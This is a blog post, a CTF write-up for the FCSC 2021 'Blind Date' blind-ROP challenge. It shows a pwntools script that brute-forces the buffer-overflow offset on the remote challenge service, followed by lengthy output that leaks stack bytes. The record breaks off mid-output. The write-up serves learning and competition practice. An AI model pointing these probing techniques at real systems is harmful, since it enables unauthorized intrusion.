<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>[FCSC 2021 - pwn] Blind Date | repr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Blind Date (489 pts) Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu’elle n’est pas sûre en lisant le fichier flag.txt sur leur s">
<meta property="og:type" content="article">
<meta property="og:title" content="[FCSC 2021 - pwn] Blind Date">
<meta property="og:url" content="https://n4sm.github.io/posts/blindate/index.html">
<meta property="og:site_name" content="repr">
<meta property="og:description" content="Blind Date (489 pts) Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu’elle n’est pas sûre en lisant le fichier flag.txt sur leur s">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-05-03T00:00:00.000Z">
<meta property="article:modified_time" content="2023-08-01T09:41:55.811Z">
<meta property="article:author" content="nasm">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="nasm">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="ret2school">
<meta property="article:tag" content="2021">
<meta property="article:tag" content="FCSC">
<meta property="article:tag" content="Blind Date">
<meta property="article:tag" content="n4sm">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/pic/wall.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>repr </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nasm </div>
      <div class="dot"></div>
      <div class="subtitle">pwn / kernel stuff </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/pwn/">
                pwn
                <div class="category-count">19</div>
            </a>
        
            <a class="category-link" href="/categories/kernel/">
                kernel
                <div class="category-count">3</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] window-of-opportunity
            </div>
          </a>
        
          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] mailman
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-blindate" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        [FCSC 2021 - pwn] Blind Date
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2021-05-03T00:00:00.000Z" itemprop="datePublished">2021-05-03</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            5.5k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2021/" rel="tag">2021</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blind-Date/" rel="tag">Blind Date</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FCSC/" rel="tag">FCSC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/n4sm/" rel="tag">n4sm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2school/" rel="tag">ret2school</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="Blind-Date-489-pts"><a href="#Blind-Date-489-pts" class="headerlink" title="Blind Date (489 pts)"></a>Blind Date (489 pts)</h1><blockquote>
<p>Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu’elle n’est pas sûre en lisant le fichier flag.txt sur leur serveur ? Les gérants de cette société n’ont pas souhaité vous donner ni le code source de leur solution, ni le binaire compilé, mais ils vous proposent uniquement un accès distant à leur service.</p>
</blockquote>
<blockquote>
<p>nc challenges2.france-cybersecurity-challenge.fr 4008</p>
</blockquote>
<p>Blind Date is a blind rop challenge I did during the <a target="_blank" rel="noopener" href="https://www.france-cybersecurity-challenge.fr/">FCSC event</a>.<br>So, no source code is provided, we juste have a netcat to which we can interact.</p>
<p>To solve this challenge I juste read carefully <a target="_blank" rel="noopener" href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">this paper</a> and applied one per one the techniques described.</p>
<h3 id="Find-the-right-offset"><a href="#Find-the-right-offset" class="headerlink" title="Find the right offset"></a>Find the right offset</h3><p>The first thing to do is to find from which offset the binary crashes, to do so I developped a small script:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&quot;challenges2.france-cybersecurity-challenge.fr&quot;</span>, <span class="number">4008</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp</span>(<span class="params">av</span>):</span><br><span class="line">    io = start()</span><br><span class="line">    io.write(av)</span><br><span class="line">    <span class="keyword">return</span> io.recvall(timeout=<span class="number">5.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_padding</span>(<span class="params">p=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">    padding = p + <span class="string">b&quot;\x90&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] sending: <span class="subst">&#123;padding&#125;</span>&quot;</span>)</span><br><span class="line">    resp = jmp(padding)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] recv: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&quot;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks &quot;</span> + padding <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">return</span> find_padding(p=padding)</span><br><span class="line">    <span class="keyword">return</span> padding[:<span class="built_in">len</span>(padding)-<span class="number">1</span>] <span class="comment"># minus one char because we do not want that padding overwrite the return address / canary / triggering a crash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(find_padding()))</span><br></pre></td></tr></table></figure>

<p>It’s basically sending checking if the right string is always received, and when it’s not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br><span class="line">[*] sending: b&#x27;\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x907:EL\xd3\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\xda5r^\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&quot;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;\xad\xe9\x7fBye!\n&quot;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd6\x97\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc1\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xe3\xb0\xff\xff\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc6\x15\x12\xfc\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\x1e\xfc\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9a\xfe\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfd\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe0\xa8\x8bn\xfd\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7f\xc6\xd8\xfe\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcd\n\xfd\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x97\xfd\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfe\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks 